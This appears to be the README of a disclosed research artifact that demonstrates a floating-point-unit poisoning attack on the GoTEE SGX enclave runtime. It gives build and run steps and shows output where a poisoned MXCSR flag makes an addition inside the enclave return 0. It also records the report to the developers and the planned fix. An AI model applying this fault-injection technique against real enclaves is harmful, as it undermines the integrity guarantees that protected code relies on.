# Proof of concept attack on GoTEE

[![build status](https://travis-matrix-badges.herokuapp.com/repos/fritzalder/faulty-point-unit/branches/master/7)](https://travis-ci.org/github/fritzalder/faulty-point-unit)

## Install GoTEE

```bash
$ sudo apt-get -yqq install golang
$ cd gotee-fpu
$ go get github.com/aghosn/serializer
$ PATH=$PATH:$HOME/go/bin
$ sudo make
```

**Note (Artifact).** This step was already executed on the lab machine for the ACSAC '20 artifact submission.

## Build and run example attack enclave

We provide a hello-world sample that executes a print from both the untrusted and trusted domains.

Example output showcasing an example run with and without FPU poisoning in an
untrusted domain and enclave, respectively. Notice the faulty result for
`VADDPD` when poisoning the denormals-as-zero MXCSR flag:

```
$ PATH=$PATH:$HOME/go/bin
$ cd example/hello-world/
$ make
$ SIM=1 ./main
From an untrusted domain:
Hello World!
[ENTRY] Control Word: 0x37f
[ENTRY] MXCSR: 0x1fa0

Add(1,2) is 3
[EXIT] Control Word: 0x37f
[EXIT] MXCSR: 0x1fa2
--
From a trusted domain:
[DEBUG] loading the program in simulation.
Cooprt at 0xc4200aa120
Cooprt.Ecall 0xc420080150, Cooprt.Ocall 0xc4200801c0
Unsafe allocation: 7fb2607cd000, size: 1f4000
[DEBUG-INFO] wrapper at 0xc4200c7880
{base: 40000000000, siz: 1000000000, mhstart: 400001ae000, mhsize: 7ffffff}
stack: 4000016f000, ssiz: 8000, tcs: 40000178000, msgx: 40000150000, tls: 40000151000
stack: 4000017f000, ssiz: 8000, tcs: 40000188000, msgx: 40000152000, tls: 40000153000
stack: 4000018f000, ssiz: 8000, tcs: 40000198000, msgx: 40000154000, tls: 40000155000
stack: 4000019f000, ssiz: 8000, tcs: 400001a8000, msgx: 40000156000, tls: 40000157000
Hello World!
[ENTRY] Control Word: 0x1f7f
[ENTRY] MXCSR: 0x1fc0

Add(1,2) is 0
[EXIT] Control Word: 0x1f7f
[EXIT] MXCSR: 0x1fc0
```

Alternatively, to execute the example attack on real SGX hardware, simply proceed as follows:

```
$ ./main
From an untrusted domain:
Hello World!
[ENTRY] Control Word: 0x37f
[ENTRY] MXCSR: 0x1fa0

Add(1,2) is 3
[EXIT] Control Word: 0x37f
[EXIT] MXCSR: 0x1fa2
--
From a trusted domain:
Hello World!
[ENTRY] Control Word: 0x1f7f
[ENTRY] MXCSR: 0x1fe0

Add(1,2) is 0
[EXIT] Control Word: 0x1f7f
[EXIT] MXCSR: 0x1fe0
```

## Disclosure and mitigation

We reported this issue to the GoTEE developers in <https://github.com/epfl-dcsl/gotee/issues/3>. The issue will be mitigated with a full `xrstor` on enclave entry.
